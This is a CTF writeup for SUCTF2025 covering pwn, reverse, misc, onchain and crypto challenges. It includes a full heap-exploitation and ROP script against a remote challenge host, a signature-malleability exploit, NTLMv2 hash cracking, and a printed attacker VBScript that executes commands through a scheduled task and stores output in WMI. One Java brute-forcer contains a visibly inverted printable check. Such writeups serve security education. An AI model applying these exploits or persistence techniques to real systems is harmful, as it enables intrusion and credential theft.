---
title: suctf2025
titleTemplate: ':title | Writeups - or4nge'
layout: doc
---

# SUCTF2025 Writeup by or4nge

::: info
**Rank: 22**
:::

## Pwn

### SU_text

申请的堆块没有初始化，可以用于leak

命令解析部分是在一个循环内进行的，chunk的地址是栈内的局部变量，可以通过11不断抬高chunk基址然后用10进行堆越界写

```python
from pwn import *
context.log_level='debug'
context.os='linux'
context.arch='amd64'

def chunk_add(idx,size):
    pl=b'\x01'
    pl+=b'\x10'
    pl+=idx.to_bytes(1,'little')
    pl+=p32(size)
    return pl

def chunk_delete(idx):
    pl=b'\x01'
    pl+=b'\x11'
    pl+=idx.to_bytes(1,'little')
    return pl

def lea_b2c(idx,offset,value):
    pl=b'\x02'
    pl+=idx.to_bytes(1,'little')
    pl+=b'\x10'
    pl+=b'\x14'
    pl+=p32(offset)
    pl+=p64(value)
    pl+=b'\x00'
    return pl

def lea_c2b(idx,offset):
    pl=b'\x02'
    pl+=idx.to_bytes(1,'little')
    pl+=b'\x10'
    pl+=b'\x15'
    pl+=p32(offset)
    pl+=p64(0)
    pl+=b'\x00'
    return pl

def output(idx,offset):
    pl=b'\x02'
    pl+=idx.to_bytes(1,'little')
    pl+=b'\x10'
    pl+=b'\x16'
    pl+=p32(offset)
    pl+=b'\x00'
    return pl

def end():
    return b'\x03'

p=remote('1.95.76.73',10010)
#p=process('./pwn')

# leak libcbase
pl=chunk_add(0,0x420)
pl+=chunk_add(1,0x420)
pl+=chunk_delete(0)
pl+=chunk_add(0,0x420)
pl+=lea_c2b(0,0)
pl+=output(0,0x100000000-0x11)

# leak heapbase
pl+=chunk_add(2,0x420)
pl+=chunk_add(3,0x420)
pl+=chunk_delete(0)
pl+=chunk_delete(2)
pl+=chunk_add(4,0x500)
pl+=chunk_add(0,0x420)
pl+=chunk_add(2,0x420)
pl+=lea_c2b(0,8)
pl+=output(0,0x100000000-0x11)
pl+=end()
p.sendafter(b'Please input some text (max size: 4096 bytes):\n',pl)

libcbase=u64(p.recv(8))-0x203b20
log.info('libcbase: '+hex(libcbase))

heapbase=u64(p.recv(8))-0x290
log.info('heapbase: '+hex(heapbase))

pl=chunk_delete(0)
pl+=chunk_delete(1)
pl+=chunk_delete(2)
pl+=chunk_delete(3)
pl+=chunk_delete(4)

# large bin attack
tcache_cnt_addr=libcbase+0x2031e8
pl+=chunk_add(0,0x418)  # edit

pl+=chunk_add(1,0x420)  # 1
pl+=chunk_add(2,0x420)  # pad
pl+=chunk_add(3,0x418)  # 3
pl+=chunk_add(4,0x420)  # pad
pl+=chunk_delete(1)
pl+=chunk_add(5,0x500)
pl+=chunk_delete(3)
pl+=b'\x02\x00'
pl+=b'\x10\x14'+p32(0)+p64(0)
pl+=b'\x10\x14'+p32(8)+p64(0)
pl+=(b'\x11\x10'+p64(0))*(0x30//4)
pl+=b'\x10\x14'+p32(0x420+0x18-0x30)+p64(tcache_cnt_addr-0x20)
pl+=b'\x00'
pl+=chunk_add(6,0x500)
pl+=end()
p.sendafter(b'Please input some text (max size: 4096 bytes):\n',pl)

# leak stack
pl=chunk_delete(6)
pl+=chunk_delete(5)
pl+=b'\x02\x04'
pl+=b'\x10\x14'+p32(0x10)+p64(0)
pl+=b'\x10\x14'+p32(0x18)+p64(0)
pl+=(b'\x11\x10'+p64(0))*(0x38//4)
pl+=b'\x10\x14'+p32(0x430-0x38)+p64(((heapbase+0x1770)>>12)^(libcbase+0x20ad50-0x10))
pl+=b'\x00'
pl+=chunk_add(7,0x500)
pl+=chunk_add(8,0x500)
pl+=lea_c2b(8,0x18)
pl+=output(8,0x100000000-0x11)
pl+=end()
p.sendafter(b'Please input some text (max size: 4096 bytes):\n',pl)

stack=u64(p.recv(8))
log.info('stack: '+hex(stack))

libc=ELF('./libc.so.6')
rdi=libcbase+0x10f75b
rsi=libcbase+0x110a4d
rcx=libcbase+0xa876e
rdx_vrcx=libcbase+0xab891
rax=libcbase+0xdd237
syscall=libcbase+0x98fa6

pl=chunk_add(9,0x500)
pl+=chunk_delete(9)
pl+=chunk_delete(7)
pl+=b'\x02\x04'
pl+=(b'\x11\x10'+p64(0))*(0x38//4)
pl+=b'\x10\x14'+p32(0x430-0x38)+p64(((heapbase+0x1770)>>12)^(stack-0x178))
pl+=b'\x00'
pl+=chunk_add(10,0x500)
pl+=chunk_add(11,0x500)
pl+=b'\x02\x0b'
rop=[
        b'./flag\x00\x00',
        p64(rdi),
        p64(stack-0x178+0x10),
        p64(rsi),
        p64(0),
        p64(rax),
        p64(2),
        p64(syscall),
        p64(rdi),
        p64(3),
        p64(rsi),
        p64(heapbase),
        p64(rcx),
        p64(heapbase+0x100),
        p64(rdx_vrcx),
        p64(0x50),
        p64(rax),
        p64(0),
        p64(syscall),
        p64(rdi),
        p64(1),
        p64(rsi),
        p64(heapbase),
        p64(rcx),
        p64(heapbase+0x100),
        p64(rdx_vrcx),
        p64(0x50),
        p64(rax),
        p64(1),
        p64(syscall)
]
offset=0x10
for gadget in rop:
    pl+=b'\x10\x14'+p32(offset)+gadget
    offset+=8
pl+=b'\x00'
pl+=end()

#gdb.attach(p)
p.sendafter(b'Please input some text (max size: 4096 bytes):\n',pl)

p.interactive()
```

## Reverse

### SU_BBRE

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// 定义校验用的字符串
char global_str1[12] = {0x41,0x6d,0x62,0x4d,0X53,0x49,0x4e,0x29,0X28};
char pwn[3] = {0x3d,0x22,0x40};
int global_str2[4] = {0x65575A2F,0xCD698F14,0x551A2993,0x5EE44018};

void function3(char* src, char* dest, int key) {
    int var_8 = 0;
    int var_4 = 0;
    // 初始化 dest 数组
    do {
        dest[var_4] = var_4;
        var_4++;
    } while (var_4 <= 0xFF);
    
    var_4 = 0;
     // 修改 dest 数组
     do{
      unsigned char temp = dest[var_4];
        int temp_index = (int)temp;
        int ecx = (temp_index + var_8);
        int temp_result = var_4 % key;
        unsigned char src_value = src[temp_result];
        int eax = (int)src_value;
        eax = (eax + ecx);
        eax = (eax + (eax >> 24)) & 0xFF;
        var_8 = (eax - temp_result) & 0xFF;
        unsigned char var_9 = dest[var_4];
        dest[var_8] = temp;
        dest[var_4] = var_9;
        var_4++;
     } while(var_4 <= 0xFF);

}

void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k)
{
    int i = 0, j = 0;
    unsigned char tmp = 0;
    for (i = 0; i < 256; i++) {
        s[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + s[i] + key[i%Len_k]) % 256;
        tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
    }
}

/*
RC4加解密函数
unsigned char* Data     加解密的数据
unsigned long Len_D     加解密数据的长度
unsigned char* key      密钥
unsigned long Len_k     密钥长度
*/
void rc4_crypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) //加解密
{
    unsigned char s[256];
    rc4_init(s, key, Len_k);
    int i = 0, j = 0, t = 0;
    unsigned long k = 0;
    unsigned char tmp;
    for (k = 0; k < Len_D; k++) {
        i = (i + 1) % 256;
        j = (j + s[i]) % 256;
        tmp = s[i];
        s[i] = s[j];
        s[j] = tmp;
        t = (s[i] + s[j]) % 256;
        Data[k] = Data[k] ^ s[t];
    }
}

void function2()
{
    char key[6] = "suctf";
    rc4_crypt(global_str2, sizeof(global_str2), key, 5);
    printf("%s",global_str2);
    printf("%s",pwn);
    
}

void function1()
{
    for (int i = 0; i < 9; i++)
    {
        global_str1[i] += i;
    }
    printf("%s",global_str1);
}

int main(int argc, char const *argv[], char const *envp[])
{
    // char user_input[20];
    // printf("please input your flag:\n");
    // scanf("%19s", user_input);
    function2();
    function1();
    return 0;
}
```

## Misc

### SU_checkin

tcp.stream eq 50 可以提取如下信息：

```plaintext
algorithm=PBEWithMD5AndDES

java -jar suctf-0.0.1-SNAPSHOT.jar --password=SePassWordLen23SUCT

spring.application.name=suctf
server.port = 8888
OUTPUT=ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=
```

需要爆破 4 位 password 后解密

```java
package com.example;

import org.jasypt.encryption.pbe.StandardPBEStringEncryptor;

public class test {
    public static void main(String[] args) throws Exception {
        String password = "SePassWordLen23SUCT";
        String alp = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        String encrypted = "ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=";

        for (int i = 0; i < alp.length(); i++) {
            for (int j = 0; j < alp.length(); j++) {
                for (int k = 0; k < alp.length(); k++) {
                    for (int l = 0; l < alp.length(); l++) {
                        try {
                            String tmp = password + alp.charAt(i) + alp.charAt(j) + alp.charAt(k) + alp.charAt(l);
                            StandardPBEStringEncryptor encryptor = new StandardPBEStringEncryptor();
                            encryptor.setPassword(tmp);
                            String decrypted = encryptor.decrypt(encrypted);
                            if (isPrintable(decrypted)) {
                                System.out.println("Password: " + tmp);
                                System.out.println("Decrypted: " + decrypted);
                            }
                        } catch (Exception e) {
                        }
                    }
                }
            }
        }
    }

    public static boolean isPrintable(String str) {
        if (str == null || str.isEmpty()) {
            return false;
        }
        for (char ch : str.toCharArray()) {
            if (ch >= 0x20 && ch <= 0x7E) {
                return false;
            }
        }
        return true;
    }
}
// Password: SePassWordLen23SUCTF666
// Decrypted: SUCTF{338dbe11-e9f6-4e46-b1e5-eca84fb6af3f}
```

### SU_AI_how_to_encrypt_plus

根据卷积以及全连接层的运算进行逆运算即可

```python
import torch
import torch.nn as nn

n = 48

class Net(nn.Module):
    def __init__(self):
        super(Net, self).__init__()
        self.linear = nn.Linear(n, n*n)
        self.conv = nn.Conv2d(1, 1, (2, 2), stride=1, padding=1)
        self.conv1 = nn.Conv2d(1, 1, (3, 3), stride=3)

    def forward(self, x):
        x = x.view(1, 1, 3, 3*n)  # torch.Size([1, 1, 3, 144])
        x = self.conv1(x)  # torch.Size([1, 1, 1, 48])
        x = x.view(n)  # torch.Size([48])
        x = self.linear(x)  # torch.Size([2304])
        x = x.view(1, 1, n, n)  # torch.Size([1, 1, 48, 48])
        x = self.conv(x)  # torch.Size([1, 1, 49, 49])
        return x

mynet = Net()
mynet.load_state_dict(torch.load('model.pth'))

def revconv(input, weight, bias):
    shape = weight.shape[2:]
    output = torch.tensor([[[[0.0 for _ in range(input.shape[3] - 1)] for _ in range(input.shape[2] - 1)] for _ in range(weight.shape[1])] for _ in range(weight.shape[0])], dtype=torch.float32)
    weight = weight.view(2, 2)
    for i in range(input.shape[2] - 1):
        for j in range(input.shape[3] - 1):
            block = input[:, :, i:i+shape[0], j:j+shape[1]].view(2, 2)
            res = block[0, 0] - bias
            if i != 0:
                res -= output[0, 0, i-1, j] * weight[0, 1]
            if j != 0:
                res -= output[0, 0, i, j-1] * weight[1, 0]
            if i != 0 and j != 0:
                res -= output[0, 0, i-1, j-1] * weight[0, 0]
            assert res % weight[1, 1] == 0
            output[0, 0, i, j] = res // weight[1, 1]
    return output

def revlinear(ciphertext, weight, bias):
    def extract_matrix(tensor, threshold):
        vector_num, matrix_dim = tensor.shape
        assert vector_num >= matrix_dim
        indpendent_vector = []
        for i in range(vector_num):
            if len(indpendent_vector) == matrix_dim:
                break
            if len(indpendent_vector) == 0:
                indpendent_vector.append(tensor[i])
            else:
                temp = torch.stack(indpendent_vector + [tensor[i]])
                if temp.shape[0] == temp.shape[1]:
                    det = torch.linalg.det(temp)
                    if abs(det) > threshold:
                        indpendent_vector.append(tensor[i])
                else:
                    indpendent_vector.append(tensor[i])
        assert len(indpendent_vector) == matrix_dim
        return torch.stack(indpendent_vector)
    output = ciphertext - bias
    output = torch.tensor([[output[i] for i in range(output.shape[0])]])
    matrix = torch.cat([weight, output.t()], dim=1)
    matrix = extract_matrix(matrix, 1e-5)
    matrix = matrix[:-1, :]
    res = torch.narrow(matrix, dim=1, start=matrix.shape[1]-1, length=1)
    matrix = matrix[:, :-1]
    output = torch.linalg.matmul(torch.linalg.inv(matrix), res)
    return output.view(48)

def revconv1(ciphertext, weight, bias):
    ciphertext = torch.round(ciphertext)
    output = torch.tensor([[[[0.0 for _ in range(144)] for _ in range(3)] for _ in range(1)] for _ in range(1)], dtype=torch.float32)
    index = 0
    for i in ciphertext[0, 0, 0]:
        tmp = int(i - bias)
        assert len(bin(tmp)[2:]) <= 9
        tmp = torch.tensor([int(j) for j in format(tmp, '09b')[::-1]]).view(3, 3)
        output[0, 0, 0:3, index:index+3] = tmp
        index += 3
    return output

ciphertext = open('ciphertext.txt', 'r').read().strip().split('\n')
ciphertext = [[float(i) for i in line.split()] for line in ciphertext]
ciphertext = torch.tensor(ciphertext, dtype=torch.float32).view(1, 1, 49, 49)

ciphertext = revconv(ciphertext, mynet.conv.weight, mynet.conv.bias)
ciphertext = ciphertext.view(2304)

ciphertext = revlinear(ciphertext, mynet.linear.weight, mynet.linear.bias)
ciphertext = ciphertext.view(1, 1, 1, 48)

ciphertext = revconv1(ciphertext, mynet.conv1.weight, mynet.conv1.bias)
ciphertext = ciphertext.view(432)

flag = ""
for i in range(0, 432, 9):
    flag += chr(int(''.join([str(int(j)) for j in ciphertext[i:i+9]]), 2))
print(flag)
# SUCTF{Mi_sika_mosi!Mi_muhe_mita,mita_movo_lata!}
```

### SU_AI_segment_ceil

拿 UNet 训练训练就行，主要在噪声的消除：

```python
import numpy as np
import torch
import cv2
from model.unet_model import UNet
import base64
from pwn import *

device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
net = UNet(n_channels=1, n_classes=1)
net.to(device=device)
net.load_state_dict(torch.load('model.pth', map_location=device))
net.eval()

def predict(base64_img):
    img_bytes = base64.b64decode(base64_img)
    img = cv2.imdecode(np.frombuffer(img_bytes, np.uint8), cv2.IMREAD_GRAYSCALE)
        
    mask = cv2.inRange(img, 200, 255)
    img = cv2.inpaint(img, mask, inpaintRadius=3, flags=cv2.INPAINT_TELEA)
    img = cv2.GaussianBlur(img, (5, 5), 0)
    laplacian = cv2.Laplacian(img, cv2.CV_64F)
    img = np.uint8(np.clip(img - 0.95 * laplacian, 0, 255))

    cv2.imwrite('remote.png', img)
    img = img.reshape(1, 1, img.shape[0], img.shape[1])
    img_tensor = torch.from_numpy(img)
    img_tensor = img_tensor.to(device=device, dtype=torch.float32)
    pred = net(img_tensor)
    pred = np.array(pred.data.cpu()[0])[0]
    pred[pred >= 0.5] = 255
    pred[pred < 0.5] = 0
    pred = cv2.cvtColor(pred, cv2.COLOR_GRAY2RGB)
    cv2.imwrite('remote_pred.png', pred)
    _, buffer = cv2.imencode('.png', pred)
    return base64.b64encode(buffer).decode()

if __name__ == "__main__":
    while True:
        count = 0
        p = remote("1.95.34.240", 10001)
        try:
            while True:
                print(f'Round {count}')
                count += 1
                base64_img = p.recvuntil(b'\n').strip().decode()
                if base64_img[:5] == 'image':
                    base64_img = base64_img[6:]
                else:
                    print(base64_img)
                    p.interactive()
                    break
                result = predict(base64_img)
                p.sendlineafter(b'can you help me segment the image:', result.encode())
            p.clean()
            p.close()
        except EOFError:
            p.clean()
            p.close()
# SUCTF{Any_help_is_better_than_no_help}
```

### Onchain Checkin

https://solscan.io/tx/21hrX9ekAihzk5M1fE7EdagACu1LGJj8j4bBbU12oNc26nxdGpXknyXTXhUzG9ukuEgnPV2h5M5Yb57geD4vgjnk?cluster=devnet

三部分：

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/suctf2025/img_0.png)

### Onchain Magician

对签名的 s 值没有严格校验，可以进行延展性攻击

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import { Script } from "forge-std/Script.sol";
import { MagicBox } from "../../src/Magician/chall.sol";

contract SolveMagician is Script {
    MagicBox target;

    function getMsgHash(address _magician) public view returns (bytes32) {
        return keccak256(abi.encodePacked("I want to open the magic box", _magician, address(0xBD958439060CeCD24c715C80dd0A9942260247D7), block.chainid));
    }

    function run() public {
        address signer = vm.addr(0x...);
        console.logAddress(signer);
        vm.startBroadcast(signer);
        target = MagicBox(0xBD958439060CeCD24c715C80dd0A9942260247D7);
        bytes32 msgHash = getMsgHash(signer);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(0x..., msgHash);
        MagicBox.Signature memory signature = MagicBox.Signature(v, r, s);
        target.signIn(signature);

        bytes32 s2 = bytes32(uint256(0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141) - uint256(s));
        MagicBox.Signature memory signature2 = MagicBox.Signature(27, r, s2);
        target.openBox(signature2);
        _check();
        vm.stopBroadcast();
    }

    function _check() private view {
        require(target.isSolved(), "Not solved");
    }
}
// SUCTF{C0n9r4ts!Y0u're_An_0ut5taNd1ng_OnchA1n_Ma9ic1an.}
```

### SU_AD

需要解决三种流量的解密问题：

-   SharpADWS 的流量（包裹在 NMF 中的 GSS-API 流量）
-   SMB2（通过 Kerberos 申请 cifs 的票据）
-   DCERPC

第一个使用 NTLM 认证，通过 NTLM 相关数据爆破用户密码：

```bash
❯ cat test.hash
sk::sk.com:b7325db726cdddbe:3d83dd54cff0f77715b97e7ae985813f:01010000000000002d2c49c4b762db014a8fd14f8291865d000000000200040053004b00010004004400430004000c0073006b002e0063006f006d0003001200440043002e0073006b002e0063006f006d0005000c0073006b002e0063006f006d00070008002d2c49c4b762db0106000400020000000800300030000000000000000100000000200000a6b014bf8a1f09368502041ded7fceb82c8ed41c09c2d199ee04b8421f0b0e9c0a001000000000000000000000000000000000000900160068006f00730074002f0073006b002e0063006f006d000000000000000000
❯ john test.hash --wordlist=rockyou.txt
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
Eminem01         (sk)
```

然后将 `Eminem01` 作为 NTLMSSP 的 Password 即可解密第一部分流量：

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/suctf2025/img_1.png)

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/suctf2025/img_2.png)

在最后一个 GSS-API 的 Payload 中可以看到是在修改 Administrator 的密码。结合编码规则：https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2

可以提取修改后的密码：`1202)78M5CcE=+!2`

这里相当于拿到了 Administrator 用户的凭据，并且后续 Kerberos 认证都是使用 Administrator 用户进行认证的。那么制作 Administrator 用户的 keytab 即可进行解密（需要注意这里用户名大小写敏感，卡了半天），使用的工具为：https://github.com/TheRealAdamBurford/Create-KeyTab

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/suctf2025/img_3.png)

然后将 keytab 文件导入 Wireshark 即可解密 DCERPC 的流量：

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/suctf2025/img_4.png)

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/suctf2025/img_5.png)

从 DCERPC 流量中可以提取出来一个 VBScript，解混淆之后得到：

```vb
Dim command
command = Base64StringDecode("QzpcV2luZG93c1w3ei5leGUgeCAtcG9PQ0RMYmtaOU10dTY3QWx5aDh1QWFGSHk2S0RzQ2JHIC15IEM6XFdpbmRvd3NcZmxhZy56aXA=")

If FileExists("C:\Windows\Temp\windows-object-8e6e9f8c-20ff-4f7b-91a6-30ba2fa08e1a.log") Then
    inputFile = "C:\Windows\Temp\windows-object-8e6e9f8c-20ff-4f7b-91a6-30ba2fa08e1a.log"
    Set inStream = CreateObject("ADODB.Stream")
    inStream.Open
    inStream.type= 1 'TypeBinary
    inStream.LoadFromFile(inputFile)
    readBytes = inStream.Read()

    Set oXML = CreateObject("Msxml2.DOMDocument")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = readBytes
    Base64Encode = oNode.text

    On Error Resume Next
    Set objTestNewInst = GetObject("Winmgmts:root\Cimv2:Win32_OSRecoveryConfigurationDataBackup.CreationClassName=""dbb76404-b72e-42fa-aa16-8a92bc066e11""")
    If Err.Number <> 0 Then
        Err.Clear
        wbemCimtypeString = 8
        Set objClass = GetObject("Winmgmts:root\cimv2:Win32_OSRecoveryConfigurationDataBackup")
        Set objInstance = objClass.spawninstance_
        objInstance.CreationClassName = "dbb76404-b72e-42fa-aa16-8a92bc066e11"
        objInstance.DebugOptions = Base64Encode
        objInstance.put_
    Else
    End If
Else
    Const TriggerTypeDaily = 1
    Const ActionTypeExec = 0
    Set service = CreateObject("Schedule.Service")
    Call service.Connect
    Dim rootFolder
    Set rootFolder = service.GetFolder("\")
    Dim taskDefinition
    Set taskDefinition = service.NewTask(0)
    Dim regInfo
    Set regInfo = taskDefinition.RegistrationInfo
    regInfo.Description = "Update"
    regInfo.Author = "Microsoft"
    Dim settings
    Set settings = taskDefinition.settings
    settings.Enabled = True
    settings.StartWhenAvailable = True
    settings.Hidden = False
    settings.DisallowStartIfOnBatteries = False
    Dim triggers
    Set triggers = taskDefinition.triggers
    Dim trigger
    Set trigger = triggers.Create(7)
    Dim Action
    Set Action = taskDefinition.Actions.Create(ActionTypeExec)
    Action.Path = "c:\windows\system32\cmd.exe"
    Action.arguments = "/Q /c " & command & " 1> C:\Windows\Temp\windows-object-8e6e9f8c-20ff-4f7b-91a6-30ba2fa08e1a.log 2>&1"
    Dim objNet, LoginUser
    Set objNet = CreateObject("WScript.Network")
    LoginUser = objNet.UserName
    If UCase(LoginUser) = "SYSTEM" Then
    Else
    LoginUser = Empty
    End If
    Call rootFolder.RegisterTaskDefinition("a2609d3c-2173-43a4-8e9a-1e9fa02eb00a", taskDefinition, 6, LoginUser, , 3)
    Call rootFolder.DeleteTask("a2609d3c-2173-43a4-8e9a-1e9fa02eb00a",0)
End If

Function FileExists(FilePath)
    Set fso = CreateObject("Scripting.FileSystemObject")
    If fso.FileExists(FilePath) Then
        FileExists=CBool(1)
    Else
        FileExists=CBool(0)
    End If
End Function

Function Base64StringDecode(ByVal vCode)
    Set oXML = CreateObject("Msxml2.DOMDocument")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Set BinaryStream = CreateObject("ADODB.Stream")
    BinaryStream.Type = 1
    BinaryStream.Open
    BinaryStream.Write oNode.nodeTypedValue
    BinaryStream.Position = 0
    BinaryStream.Type = 2
    ' All Format =>  utf-16le - utf-8 - utf-16le
    BinaryStream.CharSet = "utf-8"
    Base64StringDecode = BinaryStream.ReadText
    Set BinaryStream = Nothing
    Set oNode = Nothing
End Function
```

这里运行的命令为：

```powershell
C:\Windows\7z.exe x -poOCDLbkZ9Mtu67Alyh8uAaFHy6KDsCbG -y C:\Windows\flag.zip
```

应该需要解密 SMB2 流量拿到 flag.zip 进行解密。

因为使用 Kerberos 认证的 SMB2，使用 Administrator 的 keytab 解密后可以在 TGS-REP 中拿到对应的 sessionKey：

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/suctf2025/img_6.png)

结合对应 SMB2 流量的 sessionID 即可解密，相关配置如下：

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/suctf2025/img_7.png)

在最后一个 SMB2 流量中可以找到 flag.zip，使用上面获取到的密码解压即可：

![img](https://or4nge-images.zeroc0077.cn/writeups/2025/suctf2025/img_8.png)

### SU_RealCheckin

已知一些字符加猜

flag: `suctf{welcome_to_suctf_you_can_really_dance}`

## Crypto

### SU_signin

曲线是 BLS12-381，通过 pairing 来区分：

```python
sage: p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab
....: K = GF(p)
....: E = EllipticCurve(K, (0, 4))
....: o = 793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289
....: n1, n2 = 859267, 52437899
sage: cs = [E(i) for i in cs]
sage: G1 = cs[0] * n2
sage: G2 = cs[1] * n1
sage: flag_bits = [0, 1]
sage: for i in cs[2:]:
....:     if (n1 * i).weil_pairing(G2, o) == 1:
....:         flag_bits.append(1)
....:     elif (n2 * i).weil_pairing(G1, o) == 1:
....:         flag_bits.append(0)
sage: flag = int("".join([str(i) for i in flag_bits]), 2)
sage: flag
147236770007736828250674777089808130726841272594239717147930488717140178301
# SUCTF{We1come__T0__SUCTF__2025}
```

### SU_mathgame

```python
from Crypto.Util.number import *
from random import *
from pwn import *
context.log_level = 'debug'

while True:
    p = remote("1.95.46.185", 10006)

    pseudo_prime = 17226095350814884309562782709503476832333815043778073233750461
    p.sendlineafter(b'[+] Plz Tell Me your number: ', str(pseudo_prime).encode())

    a = 154476802108746166441951315019919837485664325669565431700026634898253202035277999
    b = 36875131794129999827197811565225474825492979968971970996283137471637224634055579
    c = 4373612677928697257861252602371390152816537558161613618621437993378423467772036
    tmp = getRandomInteger(700)
    a = tmp * a
    b = tmp * b
    c = tmp * c
    print(f"{a},{b},{c}")
    assert a / (b + c) + b / (a + c) + c / (a + b) == 4
    p.sendlineafter(b'[+] Plz give Me your a, b, c: ', str(a).encode() + b',' + str(b).encode() + b',' + str(c).encode())

    p.recvuntil(b"Let's play the game3!\n")
    zw = p.recvline().strip().decode()
    kx = p.recvline().strip().decode()
    from sage.geometry.hyperbolic_space.hyperbolic_isometry import moebius_transform

    C = ComplexField(999)
    M = random_matrix(CC, 2, 2)
    z1, w1 = C(zw[0][0]), CC(zw[0][1])
    z2, w2 = C(zw[1][0]), CC(zw[1][1])
    z3, w3 = C(zw[2][0]), CC(zw[2][1])
    kx = C(kx)
    a = Matrix([[z1*w1, w1, 1], [z2*w2, w2, 1], [z3*w3, w3, 1]]).determinant()
    b = Matrix([[z1*w1, z1, w1], [z2*w2, z2, w2], [z3*w3, z3, w3]]).determinant()
    c = Matrix([[z1, w1, 1], [z2, w2, 1], [z3, w3, 1]]).determinant()
    d = Matrix([[z1*w1, z1, 1], [z2*w2, z2, 1], [z3*w3, z3, 1]]).determinant()
    tmpM = Matrix([[a, b], [c, d]])
    res = str(ComplexField(57)(moebius_transform(tmpM, kx)) - ComplexField(57)(3e-16 + 4e-16*I))
    p.sendlineafter(b'[+] Plz Tell Me your answer: ', res.encode())
    p.recvline()
    res = p.recvline().strip().decode()
    if "No!" in res:
        p.close()
        continue
    else:
        flag = p.recvline().strip().decode()
        print(flag)
        p.close()
        break
```